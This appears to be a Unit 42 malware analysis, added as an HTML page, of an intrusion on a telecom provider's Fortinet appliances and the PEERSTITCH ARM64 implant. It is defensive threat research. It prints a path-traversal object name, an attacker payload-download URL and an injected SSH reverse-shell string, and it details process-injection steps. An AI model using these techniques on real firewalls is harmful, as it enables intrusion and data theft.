@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant</title></head><body>
+<main class="main">
+    
+<section class="section section--article">
+        <div class="pa article-banner">
+          <div class="l-container"> 
+			              <div class="l-breadcrumbs"> 
+              <ul> <li> <a href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:breadcrumb:Threat Research">Threat Research Center</a></li><li><a href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" title="Threat Research" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:breadcrumb:Threat Research">Threat Research</a></li><li class="is-current"><a href="https://unit42.paloaltonetworks.com/category/malware/" role="link" title="Malware" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:breadcrumb:Malware">Malware</a></li> </ul>
+            </div>            <div class="ab__title">
+              <a class="card-category" href="https://unit42.paloaltonetworks.com/category/malware/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Malware"><span class="ab-title__pre">Malware</span></a> 
+              <h1>Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant</h1>
+              <div class="ab__video">
+              <span class="duration"> 
+                <span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 14</span> <span class="rt-label rt-postfix"></span></span> min read              </span>
+                              </div>          
+              <div class="ab-lc__wrapper">
+                <span class="ab-title__pre">Related Products</span><div class="ab__link-cards"><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/advanced-dns-security/" role="link" title="Advanced DNS Security" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Advanced DNS Security">Advanced DNS Security</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/advanced-ip-defense/" role="link" title="Advanced IP Defense" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Advanced IP Defense">Advanced IP Defense</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/advanced-threat-prevention/" role="link" title="Advanced Threat Prevention" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Advanced Threat Prevention">Advanced Threat Prevention</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/advanced-url-filtering/" role="link" title="Advanced URL Filtering" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Advanced URL Filtering">Advanced URL Filtering</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/advanced-wildfire/" role="link" title="Advanced WildFire" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Advanced WildFire">Advanced WildFire</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/cloud-delivered-security-services/" role="link" title="Cloud-Delivered Security Services" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Cloud-Delivered Security Services">Cloud-Delivered Security Services</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/cortex/" role="link" title="Cortex" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Cortex">Cortex</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/cortex-xpanse/" role="link" title="Cortex Xpanse" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Cortex Xpanse">Cortex Xpanse</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/iot-security/" role="link" title="IoT Security" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:IoT Security">IoT Security</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/next-generation-firewall/" role="link" title="Next-Generation Firewall" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Next-Generation Firewall">Next-Generation Firewall</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/unit-42-incident-response/" role="link" title="Unit 42 Incident Response" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Unit 42 Incident Response">Unit 42 Incident Response</a></div>              </div>
+            </div>
+          </div>
+          <div class="ab__footer">
+            <div class="l-container">
+              <div class="ab__footer-wrapper">
+                <ul class="ab__features" role="list">
+                  <li role="listitem">
+				 
+					 <div class="ab__text"><span>By:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Daniel Gott" href="https://unit42.paloaltonetworks.com/author/daniel-gott/">Daniel Gott</a></li><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Shawn Westfall" href="https://unit42.paloaltonetworks.com/author/shawn-westfall/">Shawn Westfall</a></li></ul></div></li>                  <li role="listitem">
+			
+			<div class="ab__text"><span>Published:</span>October 14, 2026</div></li>					<li role="listitem"><div class="ab__text"><span>Categories:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Malware" href="https://unit42.paloaltonetworks.com/category/malware/">Malware</a></li><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Threat Research" href="https://unit42.paloaltonetworks.com/category/threat-research/">Threat Research</a></li></ul></div>
+		</li>                  <li role="listitem"><div class="ab__text"><span>Tags:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Apache" href="https://unit42.paloaltonetworks.com/tag/apache/">Apache</a></li><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:CL-STA-0954" href="https://unit42.paloaltonetworks.com/tag/cl-sta-0954/">CL-STA-0954</a></li><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:logging" href="https://unit42.paloaltonetworks.com/tag/logging/">Logging</a></li><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:network intrusion" href="https://unit42.paloaltonetworks.com/tag/network-intrusion/">Network intrusion</a></li><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:Network Sniffer" href="https://unit42.paloaltonetworks.com/tag/network-sniffer/">Network Sniffer</a></li><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:payload" href="https://unit42.paloaltonetworks.com/tag/payload/">Payload</a></li><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:reverse shells" href="https://unit42.paloaltonetworks.com/tag/reverse-shells/">Reverse shells</a></li><li><a data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:VPN" href="https://unit42.paloaltonetworks.com/tag/vpn/">VPN</a></li></ul></div>
+		</li>                </ul>
+                <div class="ab__options">
+                  <ul role="list">
+                                        <li role="listitem"><a href="https://unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/?pdf=download&amp;lg=en&amp;_wpnonce=7bc5edd981" role="link" target="_blank" title="Click here to download" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:pdfdownload"> </a></li>
+                    <li role="listitem"><a href="https://unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/?pdf=print&amp;lg=en&amp;_wpnonce=7bc5edd981" target="_blank" role="link" title="Click here to print" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:hero:pdfprint"> </a></li>
+                  </ul>
+                  
+	<div class="ab__share" id="shareDropdown" role="button" aria-expanded="false">
+	<a href="#" role="link" title="Click here to share" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:share" class="">Share</a><ul class="share-dropdown" role="menu">
+				<li role="menuitem" tabindex="-1">
+					<a href="#" class="copy-url" id="copyUrl" data-url="https://unit42.paloaltonetworks.com/fortimanager-cve-2024-47575-peerstitch-malware/" role="link" title="Copy link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:share:link"> </a>
+				</li>
+				<li role="menuitem">
+					<a href="mailto:?subject=Unit%2042%20Uncovers%20PEERSTITCH,%20a%20Stealthy%20FortiGate%20Implant&amp;body=Check%20out%20this%20article%20https%3A%2F%2Funit42.paloaltonetworks.com%2Ffortimanager-cve-2024-47575-peerstitch-malware%2F" role="link" title="Share in email" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:share:email"> </a>
+				</li>
+				<li role="menuitem">
+					<a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Ffortimanager-cve-2024-47575-peerstitch-malware%2F" target="_blank" role="link" title="Share in Facebook" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:share:facebook"> </a>
+				</li>
+				<li role="menuitem">
+					<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Ffortimanager-cve-2024-47575-peerstitch-malware%2F&amp;title=Unit%2042%20Uncovers%20PEERSTITCH,%20a%20Stealthy%20FortiGate%20Implant" target="_blank" role="link" title="Share in LinkedIn" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:share:linkedin"> </a>
+				</li>
+				<li role="menuitem">
+					<a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Ffortimanager-cve-2024-47575-peerstitch-malware%2F&amp;text=Unit%2042%20Uncovers%20PEERSTITCH,%20a%20Stealthy%20FortiGate%20Implant" target="_blank" role="link" title="Share in Twitter" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:share:twitter"> </a>
+				</li>
+				<li role="menuitem">
+					<a href="//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Ffortimanager-cve-2024-47575-peerstitch-malware%2F" target="_blank" role="link" title="Share in Reddit" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:share:reddit"> </a>
+				</li>
+				<li role="menuitem">
+					<a href="https://mastodon.social/share?text=Unit%2042%20Uncovers%20PEERSTITCH,%20a%20Stealthy%20FortiGate%20Implant%20https%3A%2F%2Funit42.paloaltonetworks.com%2Ffortimanager-cve-2024-47575-peerstitch-malware%2F" target="_blank" role="link" title="Share in Mastodon" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:share:mastodon"> </a>
+				</li>
+	  </ul>
+    </div>                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section> 
+    <section class="section blog-contents"> 
+      <div class="pa blog-editor">
+        <div class="l-container">
+          <div class="be__wrapper">
+            <div class="be__contents">
+              <div class="be__contents-wrapper">
+                <h2><a id="post-188095-_c0cifvm0symi"></a>Executive Summary</h2>
+<p>Unit 42 investigated a multi-stage network intrusion against a telecommunications organization that occurred in September 2024, which we are tracking as cluster CL-STA-0954 (aka UNC5820). The attackers behind CL-STA-0954 achieved an initial compromise by exploiting <a href="https://www.cve.org/CVERecord?id=CVE-2024-47575" target="_blank" rel="noopener">CVE-2024-47575</a> against a centralized FortiManager appliance.</p>
+<p>From that single appliance, our observations are that the attackers exfiltrated an archive containing running configurations, cryptographic material and database files containing information about more than 500 managed FortiGate firewalls. Those firewalls protected the target's own infrastructure and the networks of its clients.</p>
+<p>Following the initial compromise, the attackers behind CL-STA-0954 demonstrated a complex level of tradecraft. Aspects of the post-exploitation activity overlap with intrusions attributed to suspected nation-state actors. Armed with the stolen information, the attackers:</p>
+<ul>
+<li>Maintained long-term access</li>
+<li>Intercepted network traffic</li>
+<li>Established VPN sessions</li>
+<li>Deployed backdoors</li>
+<li>Exploited a separate privilege-escalation vulnerability</li>
+</ul>
+<p>The attackers exploited another vulnerability, <a href="https://nvd.nist.gov/vuln/detail/cve-2025-61624" target="_blank" rel="noopener">CVE-2025-61624</a>, via FortiOS auto-script path traversal. This exploit facilitated the deployment of PEERSTITCH, a novel, memory-resident ARM64 malware.</p>
+<p>PEERSTITCH leaves no persistent binary on disk, opens no listening ports and initiates no outbound network connections. Instead, it communicates through traffic generated by legitimate processes on the infected host, which makes the malware resistant to conventional endpoint and network detection.</p>
+<p>The attackers also impersonated the FortiManager platform to pull from managed firewalls of other hosts in the targeted network.</p>
+<p>Palo Alto Networks customers are better protected from this activity through the following products and services:</p>
+<ul>
+<li><a href="https://docs.paloaltonetworks.com/wildfire" target="_blank" rel="noopener">Advanced WildFire</a></li>
+<li><a href="https://docs.paloaltonetworks.com/advanced-url-filtering" target="_blank" rel="noopener">Advanced URL Filtering</a>, <a href="https://docs.paloaltonetworks.com/dns-security" target="_blank" rel="noopener">Advanced DNS Security</a> and <a href="https://www.paloaltonetworks.com/network-security/advanced-ip-defense" target="_blank" rel="noopener">Advanced IP Defense</a></li>
+<li><a href="https://docs.paloaltonetworks.com/ngfw" target="_blank" rel="noopener">Next-Generation Firewall</a> with the <a href="https://docs.paloaltonetworks.com/advanced-threat-prevention/administration" target="_blank" rel="noopener">Advanced Threat Prevention</a></li>
+<li><a href="https://docs-cortex.paloaltonetworks.com/p/XPANSE" target="_blank" rel="noopener">Cortex Xpanse</a></li>
+<li><a href="https://docs.paloaltonetworks.com/iot/getting-started/iot-security-solution" target="_blank" rel="noopener">Device Security</a></li>
+</ul>
+<p>If you think you might have been compromised or have an urgent matter, contact the <a href="https://www.paloaltonetworks.com/unit42/contact-unit42" target="_blank" rel="noopener">Unit 42 Incident Response team.</a></p>
+<table>
+<tbody>
+<tr>
+<td><b>Related Unit 42 Topics</b></td>
+<td><b><a href="https://unit42.paloaltonetworks.com/tag/vulnerability/" target="_blank" rel="noopener">Vulnerability</a>, <a href="https://unit42.paloaltonetworks.com/tag/privilege-escalation/" target="_blank" rel="noopener">Privilege Escalation</a>, <a href="https://unit42.paloaltonetworks.com/tag/linux/" target="_blank" rel="noopener">Linux</a></b></td>
+</tr>
+</tbody>
+</table>
+<h2><a id="post-188095-_6x9ntneo4gls"></a>Overview of the Intrusion</h2>
+<p>We investigated a prolonged network intrusion against a telecommunications managed service provider. The attackers demonstrated proficiency in Fortinet appliance architecture, FortiOS internals and FortiOS management protocols.</p>
+<p>Our investigation spanned the provider's own environment. We did not examine the client networks whose firewalls the provider managed. The exposure described in this report is of configuration and credential material rather than confirmed intrusion into those networks. Figure 1 below shows a flowchart illustrating an overview of the intrusion.</p>
+<figure id="attachment_188374" aria-describedby="caption-attachment-188374" class="wp-caption alignnone"><figcaption id="caption-attachment-188374" class="wp-caption-text">Figure 1. Overview of the intrusion.</figcaption></figure>
+<h2><a id="post-188095-_n6yahzthmq7o"></a>Initial Access and Network Configuration Theft (CVE-2024-47575)</h2>
+<p>During the initial phase of the intrusion, the attackers exploited <a href="https://www.fortiguard.com/psirt/FG-IR-24-423" target="_blank" rel="noopener">CVE-2024-47575</a> (referred to by external parties as FortiJump). The vulnerability allows an unauthenticated remote attacker to execute arbitrary commands via crafted requests to the <span>FMG-Access</span> (TCP port 541) management channel.</p>
+<p>During the exploitation, the attackers registered a rogue Virtual FortiGate appliance named <span>localhost</span> (serial number <span>FMG-VMTM23017412</span>) to the central FortiManager instance, originating from external attacker infrastructure (<span>45.32.41[.]202</span>, later modified to <span>198.199.122[.]22</span>).</p>
+<p>Immediately following device registration, the attacker generated a configuration archive named <span>.tm</span> in the FortiManager file system, which they exfiltrated shortly thereafter. Analysis of this artifact revealed:</p>
+<ul>
+<li>The FortiManager appliance's own serial number and its management relationships to every enrolled device</li>
+<li>Complete running configuration files for more than 500 managed FortiGate firewalls across internal infrastructure and client networks</li>
+<li>Central management SQLite databases: <span>global.db</span> (containing administrative domains, global objects and policy packages) and <span>revinfo.db</span> (containing device revision metadata)</li>
+<li>A flat text inventory listing more than 500 FortiGate serial numbers alongside their respective public IP addresses</li>
+<li>Internal network topology maps, routing tables and interface configurations</li>
+<li>Ciphertext administrative, local and SSL/VPN credentials</li>
+<li>Encoded cryptographic trust material, including public certificates and private keys</li>
+</ul>
+<h2><a id="post-188095-_ffr50mr8w3ce"></a>Reconnaissance and Targeted Traffic Sniffing</h2>
+<p>Following an extended dwell period, the attackers pivoted to active network reconnaissance. They used the compromised FortiManager device to push unauthorized sniffer configurations to multiple downstream managed FortiGate firewalls.</p>
+<p>The packet captures targeted unencrypted HTTP traffic and 11 specific services over different TCP ports to intercept sensitive communications and map network perimeters. Table 1 below shows the characteristics of these services.</p>
+<table>
+<tbody>
+<tr>
+<td><strong>Port</strong></td>
+<td><strong>Service Identifier</strong></td>
+<td><strong>Target Protocol Purpose</strong></td>
+<td><strong>Assessed Intent</strong></td>
+</tr>
+<tr>
+<td><span>3696</span></td>
+<td><span>Telnet Com Port Control</span></td>
+<td>Remote administration</td>
+<td>Cleartext credential interception</td>
+</tr>
+<tr>
+<td><span>3697</span></td>
+<td><span>nw-license</span></td>
+<td>License management</td>
+<td>Internal communications capture</td>
+</tr>
+<tr>
+<td><span>3698</span></td>
+<td><span>Sagectlpanel</span></td>
+<td>Control panel</td>
+<td>Cleartext credential interception</td>
+</tr>
+<tr>
+<td><span>3699</span></td>
+<td><span>kpn-icw</span></td>
+<td>Telecom service</td>
+<td>Internal communications capture</td>
+</tr>
+<tr>
+<td><span>3700</span></td>
+<td><span>lrs-paging</span></td>
+<td>Paging and telemetry</td>
+<td>Internal communications capture</td>
+</tr>
+<tr>
+<td><span>3701</span></td>
+<td><span>netcelera</span></td>
+<td>Network acceleration</td>
+<td>Internal network topology mapping</td>
+</tr>
+<tr>
+<td><span>3702</span></td>
+<td><span>ws-discovery</span></td>
+<td>Web services discovery</td>
+<td>Active host discovery</td>
+</tr>
+<tr>
+<td><span>3703</span></td>
+<td><span>adobeserver-3</span></td>
+<td>Application backend</td>
+<td>Internal service telemetry</td>
+</tr>
+<tr>
+<td><span>3704</span></td>
+<td><span>adobeserver-4</span></td>
+<td>Application backend</td>
+<td>Internal service telemetry</td>
+</tr>
+<tr>
+<td><span>3705</span></td>
+<td><span>adobeserver-5</span></td>
+<td>Application backend</td>
+<td>Internal service telemetry</td>
+</tr>
+<tr>
+<td><span>3706</span></td>
+<td><span>rt-event</span></td>
+<td>Real-time events</td>
+<td>Event stream monitoring</td>
+</tr>
+</tbody>
+</table>
+<p><span>Table 1. Services the attackers used to intercept sensitive communications and map network perimeters.</span></p>
+<p>In a subsequent phase of reconnaissance, attackers deployed additional packet-capture rules to core perimeter firewalls targeting:</p>
+<ul>
+<li><strong>UDP port 69 (TFTP):</strong> File, communications, firmware and configuration capture</li>
+<li><strong>UDP ports 1812 and 1813 (RADIUS and RADIUS-Accounting):</strong> Network authentication sniffing</li>
+<li><strong>TCP port 389 (LDAP):</strong> Active Directory query interception and directory enumeration</li>
+</ul>
+<h2><a id="post-188095-_ay71it9y9h6i"></a>Credential Decryption and Initial Re-Entry</h2>
+<p>The exfiltrated FortiGate configurations contained sensitive credentials stored as reversible ciphertext. We confirmed that the credentials were recoverable by successfully brute-forcing administrative and SSL/VPN passwords from the exfiltrated configuration files.</p>
+<p>Using legitimate credentials, the attackers established unauthorized FortiGate SSL/VPN sessions to perimeter firewalls from known external staging infrastructure (<span>23.240.77[.]233</span> and <span>47.18.167[.]159</span>). These sessions granted the attackers authenticated access into internal network-management segments.</p>
+<h2><a id="post-188095-_guyq53ar8k05"></a>Privilege Escalation: CVE-2025-61624</h2>
+<p>During the intrusion, the attackers exploited <a href="https://fortiguard.fortinet.com/psirt/FG-IR-26-122" target="_blank" rel="noopener">CVE-2025-61624</a> to escalate from FortiOS administrative access to root on the underlying firewall operating system. A FortiOS administrator, including a<span> super_admin</span>, operates within a restricted management command line with no shell access and no direct control over the appliance file system or its running processes. The daemons that implement FortiOS run as root beneath that interface.</p>
+<p>The vulnerability allows an authenticated administrative account to read and write arbitrary files as root via path traversal in the FortiOS CLI <span>system.auto-script</span> engine. The auto-script object name is not sanitized, allowing a name containing traversal sequences to place the script body outside the intended directory, at any file system location. The script executes with the privileges of the auto-script engine.</p>
+<p>The sanitized event below highlights the creation of the traversal object <span>../../../../setup</span> used to drop the PEERSTITCH initial-stage loader shown below in Figure 2.</p>
+<figure id="attachment_188286" aria-describedby="caption-attachment-188286" class="wp-caption alignnone"><figcaption id="caption-attachment-188286" class="wp-caption-text">Figure 2. Fortinet log capturing exploitation of CVE-2025-61624 to run the PEERSTITCH loader.</figcaption></figure>
+<h2><a id="post-188095-_mc1xfw919f8j"></a>Technical Analysis of the PEERSTITCH Implant</h2>
+<p>PEERSTITCH is a 64-bit Linux ARM64 executable written in C and statically linked against <span>glibc</span>. It acts as a one-shot process memory patching injector targeting two core FortiOS daemons:</p>
+<ul>
+<li><span>/bin/miglogd</span>: The central system and traffic logging daemon</li>
+<li><span>/bin/iked</span>: The IKE/IPsec VPN service daemon handling cryptographic negotiation</li>
+</ul>
+<figure id="attachment_188297" aria-describedby="caption-attachment-188297" class="wp-caption alignnone"><figcaption id="caption-attachment-188297" class="wp-caption-text">Figure 3. Flowchart of PEERSTITCH activity.</figcaption></figure>
+<p>Figure 3 shows a flow chart of PEERSTITCH activity, which we will examine in greater detail.</p>
+<h3><a id="post-188095-_pn9o7rjc8654"></a>Delivery and Staging Chain</h3>
+<p><strong>1). Downloader initialization:</strong> Exploiting CVE-2025-61624, the attackers pushed <span>../../../../setup</span> to a select number of firewalls</p>
+<p><strong>2). Payload retrieval:</strong> The script downloaded five files from <span>hxxp[:]//23.240.77[.]233:8085/</span> into <span>/data2/template/</span>:</p>
+<ul>
+<li><span>pM.js</span>: Environment preparation script (self-deleting)</li>
+<li><span>a.js</span> (saved as <span>index.js</span>): Emscripten JavaScript runtime module</li>
+<li>a<span>.wasm</span> (saved as <span>index.wasm</span>): Compiled WebAssembly binary module</li>
+<li><span>b.js</span> (saved as <span>ipssem.js</span>): Deployment orchestrator script</li>
+<li><span>dd</span> (saved as <span>lldprx</span>): Native ARM64 ELF binary injector (PEERSTITCH core)</li>
+</ul>
+<p><strong>3). Execution:</strong> Following an execution delay, <span>ipssem.js</span> launched <span>lldprx</span> with arguments <span>lldprx!index.js!index.wasm!ipssem.js!lldprx!yyyy!pM.js</span></p>
+<h3><a id="post-188095-_n4i9lthtkx0b"></a>Injector Execution and Process Parasitization</h3>
+<p>The <span>lldprx</span> binary performs a single-pass execution sequence:</p>
+<ol>
+<li><strong>Process discovery:</strong> Iterates through <span>/proc/</span>, parses<span> /proc/&lt;pid&gt;/cmdline</span> and locates the process identifiers (PIDs) for <span>/bin/miglogd</span> and <span>/bin/iked</span></li>
+<li><strong>Memory layout enumeration:</strong> Reads <span>/proc/&lt;pid&gt;/</span>maps to extract the base addresses and memory boundaries of both target daemons</li>
+<li><strong>Process attachment:</strong> Attaches to both running processes using <span>ptrace(PTRACE_SEIZE, pid)</span> and halts execution via <span>PTRACE_INTERRUPT</span></li>
+<li><strong>Register state capture:</strong> Calls <span>ptrace(PTRACE_GETREGSET, pid)</span> to snapshot all ARM64 general-purpose registers (<span>X0</span> through <span>X30</span>), the stack pointer (<span>SP</span>) and program counter (<span>PC</span>)</li>
+<li><strong>Dynamic shellcode construction:</strong> Generates an ARM64 bootstrap stub dynamically. The bootstrap executes an <span>mmap</span> syscall (<span>X8 = 0xDE</span>) requesting <span>0x4000</span> (16,384 bytes) of <span>PROT_READ | PROT_WRITE | PROT_EXEC (RWX)</span> memory mapped as <span>MAP_PRIVATE | MAP_ANONYMOUS</span></li>
+<li><strong>Payload injection:</strong> Writes a 1,344-byte injection payload into the newly allocated RWX buffer via <span>/proc/&lt;pid&gt;/mem</span></li>
+</ol>
+<h3><a id="post-188095-_sdxs2ocfwxa1"></a><strong>C</strong>overt IPC and Cross-Daemon Memory Sharing</h3>
+<p>Instead of using network sockets or disk files, PEERSTITCH creates a covert, memory-resident communication bridge between <span>/bin/miglogd</span> and <span>/bin/iked</span>.</p>
+<p>Figure 4 shows a flowchart for PEERSTITCH network traffic.</p>
+<figure id="attachment_188308" aria-describedby="caption-attachment-188308" class="wp-caption alignnone"><figcaption id="caption-attachment-188308" class="wp-caption-text">Figure 4. Flowchart for PEERSTITCH network traffic.</figcaption></figure>
+<ul>
+<li><strong>Passive traffic monitoring:</strong> Inside both daemons, the hook code inspects data already passing through the process without redirecting packets. It evaluates string patterns using <span>strstr()</span> for two specific markers:
+<ul>
+<li><strong>TCP port marker:</strong> <span>8550</span> (embedded within traffic data, not a listening port)</li>
+<li><strong>IP address marker:</strong> <span>169.254.0.1</span> (link-local identifier used for pattern matching)</li>
+</ul>
+</li>
+<li><strong>Tag extraction and buffering:</strong> When a marker is identified, the hook extracts an associated session token or identifier (up to 31 bytes) and writes it into a 16-slot circular ring buffer at offset <span>+0x0F0</span></li>
+<li><strong>Cross-process write:</strong> The hook iterates through its forwarding table at offset <span>+0x400</span> (populated with the counterpart daemon's PID and buffer base address). It invokes <span>open(), lseek()</span> and <span>write()</span> on <span>/proc/&lt;counterpart_pid&gt;/mem</span>, writing the extracted tag directly into the other daemon's memory.</li>
+<li><strong>Conditional execution branching:</strong> When <span>/bin/iked</span> processes subsequent VPN sessions, its hook inspects its injection buffer. If a corresponding tag exists, the hook takes an alternate return branch (<span>ADRP</span> return path), bypassing default FortiOS security validations.</li>
+</ul>
+<h3><a id="post-188095-_milcs32q86ls"></a>Memory Patching and Branch Path Modification</h3>
+<p>To suppress tamper detection and alter default daemon routines, PEERSTITCH applies direct NOP patches (<span>0xAA0003E0</span>, corresponding to <span>MOV X0, X0</span> on ARM64) to three static offsets within target process memory:</p>
+<ul>
+<li><span>base + 0x106F7B8</span></li>
+<li><span>base + 0x1072E20</span></li>
+<li><span>base + 0x109A570</span></li>
+</ul>
+<p>A 20-byte trampoline patch is written to <span>base + 0x135102C</span> to redirect standard execution into the allocated RWX hook buffer. Figure 5 shows a visual memory layout of the 16 KB buffer used by the ARM64 PEERSTITCH payload.</p>
+<figure id="attachment_188319" aria-describedby="caption-attachment-188319" class="wp-caption alignnone"><figcaption id="caption-attachment-188319" class="wp-caption-text">Figure 5. A visual memory layout of the 16 KB buffer utilized by the ARM64 PEERSTITCH payload.</figcaption></figure>
+<h3><a id="post-188095-_rpcwhwfonrxh"></a><strong>Apache mod_md ACME Reverse Shell Command and Control</strong></h3>
+<p>Alongside PEERSTITCH, the attackers established a command and control channel by weaponizing the native Apache <span>mod_md</span> (Managing Domains) module on FortiGate firewalls. This module uses the Automated Certificate Management Environment (<a href="https://www.paloaltonetworks.com/cyberpedia/what-is-acme-protocol" target="_blank" rel="noopener">ACME</a>) protocol.</p>
+<p>The attackers pushed an auto-script object to create <span>../../tmp/apache2/conf/md-acme.conf</span>, as shown below in Figure 6.</p>
+<figure id="attachment_188330" aria-describedby="caption-attachment-188330" class="wp-caption alignnone"><figcaption id="caption-attachment-188330" class="wp-caption-text">Figure 6. Fortinet log capturing exploitation of CVE-2025-61624 to run <span>md-acme.conf</span>.</figcaption></figure>
+<h3><a id="post-188095-_ulcsdbtel5c1"></a>Weaponization Mechanics</h3>
+<p><strong>1). Rogue certificate authority initialization:</strong> The account.json state file demonstrates the initial registration with the attacker's <a href="https://www.paloaltonetworks.com/cyberpedia/what-is-acme-protocol" target="_blank" rel="noopener">ACME server</a>, explicitly routing ACME directory requests to external infrastructure</p>
+<figure id="attachment_188341" aria-describedby="caption-attachment-188341" class="wp-caption alignnone"><figcaption id="caption-attachment-188341" class="wp-caption-text">Figure 7. Rouge ACME configuration file <span>account.json</span>.</figcaption></figure>
+<p><strong>2). Challenge orchestration:</strong> The <span>order.json</span> file outlines the pending certificate order, mapping the authorization and finalization URLs directly to the attacker's server</p>
+<figure id="attachment_188352" aria-describedby="caption-attachment-188352" class="wp-caption alignnone"><figcaption id="caption-attachment-188352" class="wp-caption-text">Figure 8. Rouge ACME configuration file <span>order.json</span>.</figcaption></figure>
+<p><strong>3). Command execution via DNS-01 challenge:</strong> <span>MDChallengeDns01</span> was mapped directly to <span>/bin/node</span>. When Apache initiates a certificate validation challenge, it executes Node.js with parameters retrieved from the remote ACME server. The <span>job.json</span> debug log reveals how the attackers exploited this by injecting shell commands (<span>kali@23.240.77[.]233:8084:b -F /tmp/upfile/ssh_config -i</span>) directly into the domain name field of the challenge request, initiating an SSH-based reverse shell.</p>
+<figure id="attachment_188363" aria-describedby="caption-attachment-188363" class="wp-caption alignnone"><figcaption id="caption-attachment-188363" class="wp-caption-text">Figure 9. Rouge ACME debug logs.</figcaption></figure>
+<p><strong>4). Continuous polling loop:</strong> <span>Setting MDRenewMode always</span> forced the Apache daemon to continuously trigger these malicious renewal challenges. Because the DNS-01 challenge was mapped to <span>/bin/node</span>, this polling cycle ensured the continuous re-execution of the injected payload, establishing a persistent outbound reverse-shell communication channel.</p>
+<h2><a id="post-188095-_9rq2g5ps6ks5"></a>Management Impersonation and FortiGate to FortiManager Chained Exploitation</h2>
+<p><a href="https://docs.fortinet.com/document/fortigate/6.4.0/ports-and-protocols/373486/fgfm-fortigate-to-fortimanager-protocol" target="_blank" rel="noopener">FortiGate to FortiManager (FGFM)</a> communications occur over TCP port 541 using cryptographic trust material requested and validated against appliance serial numbers. The archive exfiltrated during the initial FortiJump compromise contained this material, along with the serial numbers and management relationships of every downstream device.</p>
